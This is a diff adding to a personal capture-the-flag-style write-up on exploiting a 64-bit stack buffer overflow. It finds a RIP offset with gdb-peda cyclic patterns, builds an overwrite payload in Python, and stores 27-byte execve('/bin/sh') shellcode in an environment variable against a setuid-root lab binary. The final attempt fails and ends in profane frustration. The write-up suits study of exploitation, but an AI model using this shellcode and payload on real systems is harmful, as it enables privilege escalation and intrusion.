@@ -109,3 +109,74 @@ using **cyclic pattern**
 gdb-peda$ pattern_create 400 in.txt
 Writing pattern of 400 chars to filename "in.txt"
 ```
+run again
+```
+gdb-peda$ r < in.txt
+.
+.
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000400606 in vuln ()
+gdb-peda$ x/wx $rsp
+0x7fffffffe478: 0x41413741
+```
+the cyclic pattern can be seen on the stack, find the offset
+```
+gdb-peda$ pattern_offset 0x41413741
+1094793025 found at offset: 104
+```
+Updating python exploit to use offset **104**
+```
+#!/usr/bin/env python
+from struct import *
+
+buf = ""
+buf += "A"*104                      # offset to RIP
+buf += pack("<Q", 0x424242424242)   # overwrite RIP with 0x0000424242424242
+buf += "C"*290                      # padding to keep payload length at 400 bytes
+
+f = open("in.txt", "w")
+f.write(buf)
+```
+*pack("<Q", 0x424242424242): **'Q' conversion codes are available in native mode only if the platform C compiler supports C long long***
+```
+gdb-peda$ r < in.txt
+.
+.
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000424242424242 in ?? ()
+```
+*RIP has been controlled **at laaaast***
+
+Now shellcode can be written directly to stack and return to it, **27 byte long shellcode** that executes execve("/bin/sh"), stored on the stack via an env variable, and find its address on the stack
+```
+$ export PWN=`python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`
+```
+*finding address using getenvaddr **https://github.com/historypeats/getenvaddr.git***
+```
+$ ./getenvaddr PWN ./classic
+PWN will be at 0x7ffd0fd15ed5
+```
+in gdb-peda
+```
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00007ffec4389ed5 in ?? ()
+```
+*RIP was overwritten by the correct address*
+```
+$ sudo chown root classic
+$ sudo chmod 4755 classic
+```
+But
+```
+$ python2.7 e.py
+$ (cat in.txt ; cat) | ./classic
+Try to exec /bin/sh
+Read 400 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+No shell for you :(
+whoami
+Segmentation fault (core dumped)
+```
+**wtf, doesn't fucking work, nice, fuck this shit**
